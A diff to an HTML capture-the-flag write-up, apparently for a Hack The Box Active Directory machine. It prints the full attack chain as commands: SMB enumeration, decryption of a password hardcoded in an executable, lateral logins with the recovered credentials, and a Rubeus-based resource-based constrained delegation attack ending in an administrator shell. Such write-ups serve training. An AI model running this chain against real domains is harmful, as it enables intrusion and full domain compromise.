@@ -23,67 +23,70 @@
         </div>
         <div class="notion-body">
             <h2>Enumeration</h2>
-            <p> Nmap founds that there multiple ports which reveals that an active directory machine is towards us</p>
-            <pre><code class="language-bash">nmap -sV -O 10.10.11.174</code></pre>
+            <ul>
+                <p> Nmap founds that there multiple ports which reveals that an active directory machine is towards us</p>
+                <pre><code class="language-bash">nmap -sV -O 10.10.11.174</code></pre>
 
-            <p> Having in mind that SMB is present we listed the available shares and found an intersting one</p>
-            <pre><code class="language-bash">smbclient -L 10.10.11.174 -N  
-smbclient //10.10.11.174/support-tools</code></pre>
-            <p>Inside this share we found a interesting .exe file which it was devolped by some sys admin (UserInfo.exe)</p>
-            <p>Performing some debugging with dnspy we found out that the software uses a cyphered credential and a user called ldap. Performing reverse engineering with the following python script </p>
-            <pre><code class="language-py"></code>import base64
-enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
-key = b"armando"
+                <p> Having in mind that SMB is present we listed the available shares and found an intersting one</p>
+                <pre><code class="language-bash">smbclient -L 10.10.11.174 -N  
+    smbclient //10.10.11.174/support-tools</code></pre>
+                <p>Inside this share we found a interesting .exe file which it was devolped by some sys admin (UserInfo.exe)</p>
+                <p>Performing some debugging with dnspy we found out that the software uses a cyphered credential and a user called ldap. Performing reverse engineering with the following python script </p>
+                <pre><code class="language-py"></code>import base64
+    enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+    key = b"armando"
 
-# Decodificar Base64
-cipher_bytes = base64.b64decode(enc_password)
+    # Decodificar Base64
+    cipher_bytes = base64.b64decode(enc_password)
 
-# Desencriptar aplicando XOR byte a byte con la clave y 223
-plain_bytes = bytearray(len(cipher_bytes))
-for i in range(len(cipher_bytes)):
-    plain_bytes[i] = cipher_bytes[i] ^ key[i % len(key)] ^ 223
+    # Desencriptar aplicando XOR byte a byte con la clave y 223
+    plain_bytes = bytearray(len(cipher_bytes))
+    for i in range(len(cipher_bytes)):
+        plain_bytes[i] = cipher_bytes[i] ^ key[i % len(key)] ^ 223
 
-# Convertir a string (puedes probar utf-8 o default)
-password = plain_bytes.decode('utf-8', errors='ignore')
-print("Contraseña desencriptada:", password)
-</pre>
+    # Convertir a string (puedes probar utf-8 o default)
+    password = plain_bytes.decode('utf-8', errors='ignore')
+    print("Contraseña desencriptada:", password)
+    </pre>
 
-        <p>That way we discovered the following credentials</p>
-        <pre><code class="language-bash">User:ldap / Pass:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></pre>
+            <p>That way we discovered the following credentials</p>
+            <pre><code class="language-bash">User:ldap / Pass:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></pre>
 
-        <p> Then we used bloodhound using the user previously found.</p>
-        <pre><code class="language-bash">bloodhound-python --dns-tcp -ns 10.10.11.174  -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</code></pre>
+            <p> Then we used bloodhound using the user previously found.</p>
+            <pre><code class="language-bash">bloodhound-python --dns-tcp -ns 10.10.11.174  -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</code></pre>
 
-        <p>Using the bloodhound interface we checked the following routes "Shortest paths to system trusted for unconstrained delegation"</p>
-        <p>This way we found a user called support which belongs to group SHARED SUPPORT ACCOUNTS (non default). This group has permissions "Generic all".</p>
-        <p>Then we performed ldap search to findout credentials for the support user</p>
+            <p>Using the bloodhound interface we checked the following routes "Shortest paths to system trusted for unconstrained delegation"</p>
+            <p>This way we found a user called support which belongs to group SHARED SUPPORT ACCOUNTS (non default). This group has permissions "Generic all".</p>
+            <p>Then we performed ldap search to findout credentials for the support user</p>
 
-        <pre><code class="language-bash">ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb'</code></pre>
-        <p> With the previous search, the info field contains the following string "Ironside47pleasure40Watchful" </p>
+            <pre><code class="language-bash">ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb'</code></pre>
+            <p> With the previous search, the info field contains the following string "Ironside47pleasure40Watchful" </p>
 
-        <p> Performing login and checking credentials for user support</p>
-        <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'</code></pre>
-        
-        <p>Performing Resource-based Constrained Delegation attack</p>
-        <p> To do so, we imported the following scripts PowerView.ps1, Powermad.ps1, Rubeus.exe</p>
-        <p>Creation of fake computer and configuration</p>
-        <pre><code class="language-powershell">Import-Module .\PowerView.ps1
-Import-Module .\Powermad.ps1</code></pre>
-        <pre><code class="language-powershell">New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code></pre>
-        <pre><code class="language-powershell">$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
-$SDBytes = New-Object byte[] ($SD.BinaryLength)
-$SD.GetBinaryForm($SDBytes, 0)</code></pre>
-        <pre><code class="language-powershell">Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code></pre>
-        
-        <p>Using Rubeus.exe to get the ticket</p>
-        <pre><code class="language-powershell">Rubeus.exe hash /password:Summer2018!</code></pre>
-        <pre><code class="language-powershell">Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code></pre>
-        <p>With the previous ticket you adquire the ticket. Save the ticket into a file named <b>ticket.kirbi.b64</b> without spaces. <a class="notion-link" href="https://www.browserling.com/tools/remove-all-whitespace"> Website to do so</a></p>
-        <pre><code class="language-bash">base64 -d ticket.kirbi.b64 > ticket.kirbi</code></pre>
-        <pre><code class="language-bash">python3 ticketConverter.py ticket.kirbi ticket.ccache</code></pre>
-        <pre><code class="language-bash">KRB5CCNAME=ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass</code></pre>
-        
+            <p> Performing login and checking credentials for user support</p>
+            <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'</code></pre>
+            </ul>
+        <h2>Privilege Escalation</h2>
+        <ul>
+            <p>Performing Resource-based Constrained Delegation attack</p>
+            <p> To do so, we imported the following scripts PowerView.ps1, Powermad.ps1, Rubeus.exe</p>
+            <p>Creation of fake computer and configuration</p>
+            <pre><code class="language-powershell">Import-Module .\PowerView.ps1
+    Import-Module .\Powermad.ps1</code></pre>
+            <pre><code class="language-powershell">New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code></pre>
+            <pre><code class="language-powershell">$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+    $SD.GetBinaryForm($SDBytes, 0)</code></pre>
+            <pre><code class="language-powershell">Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code></pre>
+            
+            <p>Using Rubeus.exe to get the ticket</p>
+            <pre><code class="language-powershell">Rubeus.exe hash /password:Summer2018!</code></pre>
+            <pre><code class="language-powershell">Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code></pre>
+            <p>With the previous ticket you adquire the ticket. Save the ticket into a file named <b>ticket.kirbi.b64</b> without spaces. <a class="notion-link" href="https://www.browserling.com/tools/remove-all-whitespace"> Website to do so</a></p>
+            <pre><code class="language-bash">base64 -d ticket.kirbi.b64 > ticket.kirbi</code></pre>
+            <pre><code class="language-bash">python3 ticketConverter.py ticket.kirbi ticket.ccache</code></pre>
+            <pre><code class="language-bash">KRB5CCNAME=ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass</code></pre>
+        </ul>    
         
 
         </div>
